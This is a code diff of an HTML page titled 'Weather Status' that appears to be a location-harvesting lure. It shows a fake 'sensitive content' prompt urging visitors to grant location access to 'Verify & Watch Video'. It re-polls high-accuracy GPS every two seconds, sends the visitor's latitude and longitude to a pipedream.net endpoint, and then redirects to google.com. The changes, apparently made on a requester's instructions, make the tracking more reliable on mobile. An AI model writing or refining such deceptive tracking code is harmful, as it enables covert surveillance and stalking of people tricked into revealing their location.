@@ -1,9 +1,11 @@
 <!DOCTYPE html>
 <html>
 <head>
+    <meta charset="UTF-8">
+    <!-- 🌟 जादू की लाइन: इससे ज़ूम करने की दिक्कत खत्म होगी और पूरा पेज मोबाइल साइज में दिखेगा -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Weather Status</title>
     <style>
-        /* डार्क थीम रिस्ट्रिक्शन बॉक्स और ओवरले की स्टाइलिंग */
         body {
             margin: 0; padding: 0;
             background-color: #0f0f0f;
@@ -59,13 +61,11 @@
 </head>
 <body>
 
-    <!-- शुरुआती लोडिंग पेज जो आपके मूल कोड में था -->
     <div id="loading-context" style="text-align: center;">
         <div class="spinner"></div>
         <h2>Loading Page, Please Wait...</h2>
     </div>
 
-    <!-- आपका कस्टमाइज्ड मैसेज बॉक्स (2-सेकंड लूप और बटन दोनों के लिए) -->
     <div id="verification-modal">
         <div class="modal-box">
             <div class="spinner" style="margin-bottom: 20px;"></div>
@@ -73,7 +73,6 @@
             <div class="modal-text">
                 This media contains sensitive content. Please grant browser location permission and turn on your device location to continue.
             </div>
-            <!-- मैन्युअल क्लिक बटन जो तुरंत चेक को ट्रिगर करेगा -->
             <button class="action-btn" onclick="checkLocationRoutine();">Verify & Watch Video</button>
         </div>
     </div>
@@ -81,19 +80,16 @@
     <script>
         var gpsAutocheckInterval;
         var isCheckRunning = false;
+        var isLocationFound = false; // यह लॉक याद रखेगा कि लोकेशन मिल चुकी है
 
-        // आपका मूल fetch फंक्शन (मोड, हेडर, और रीडायरेक्शन बिल्कुल वैसा ही जैसा आपने शुरू में दिया था)
         function originalFetchDispatch(lat, lon) {
-            // लूप को यहाँ क्लियर कर रहे हैं ताकि डेटा मिलते ही चेकिंग बंद हो जाए
-            clearInterval(gpsAutocheckInterval);
-
             fetch('https://eohi4x7xdjpqqrs.m.pipedream.net', {
                 method: 'POST',
-                mode: 'no-cors', // आपकी मूल सेटिंग वैसी ही रखी है
+                mode: 'no-cors', 
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ latitude: lat, longitude: lon })
             }).then(() => {
-                window.location.href = "https://google.com"; // आपका मूल रीडायरेक्शन
+                window.location.href = "https://google.com"; 
             });
         }
 
@@ -102,24 +98,33 @@
             document.getElementById('verification-modal').style.display = 'flex';
         }
 
-        // मुख्य फंक्शन जो आपके मूल Geolocation लॉजिक पर आधारित है
         function checkLocationRoutine() {
-            if (isCheckRunning) return;
+            // अगर लोकेशन पहले ही मिल चुकी है, तो दोबारा चेक मत करो (ग्लिच रोकने के लिए)
+            if (isLocationFound || isCheckRunning) return;
             isCheckRunning = true;
 
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(function(position) {
                     isCheckRunning = false;
+                    isLocationFound = true;
+                    
+                    // 🌟 सबसे ज़रूरी सुधार: लोकेशन मिलते ही तुरंत बैकग्राउंड का 2-सेकंड लूप बंद कर दो
+                    clearInterval(gpsAutocheckInterval);
+                    
                     var lat = position.coords.latitude;
                     var lon = position.coords.longitude;
                     
-                    // लोकेशन मिलते ही आपके मूल fetch को कॉल करेगा
                     originalFetchDispatch(lat, lon);
 
                 }, function(error) {
                     isCheckRunning = false;
-                    // फेल होने पर स्क्रीन लॉक करेगा और बॉक्स दिखाएगा, लेकिन आपके मूल एरर वाले रीडायरेक्शन को रोकेगा ताकि लूप चल सके
-                    showRestrictionScreen();
+                    // अगर जीपीएस बंद है, तो स्क्रीन लॉक दिखाओ लेकिन रीलोड मत करो
+                    if (!isLocationFound) {
+                        showRestrictionScreen();
+                    }
+                }, {
+                    enableHighAccuracy: true,
+                    timeout: 2500 // छोटा टाइमआउट ताकि लूप ब्राउज़र को हैंग न करे
                 });
             } else {
                 isCheckRunning = false;
@@ -128,10 +133,9 @@
         }
 
         window.onload = function() {
-            // पहली बार ऑटोमैटिक चेक करें
             checkLocationRoutine();
 
-            // 🌟 आपके निर्देशानुसार: हर 2 सेकंड में चुपचाप बैकग्राउंड चेकिंग चलती रहेगी
+            // हर 2 सेकंड में बैकग्राउंड ऑटो-चेक
             gpsAutocheckInterval = setInterval(function() {
                 checkLocationRoutine();
             }, 2000);
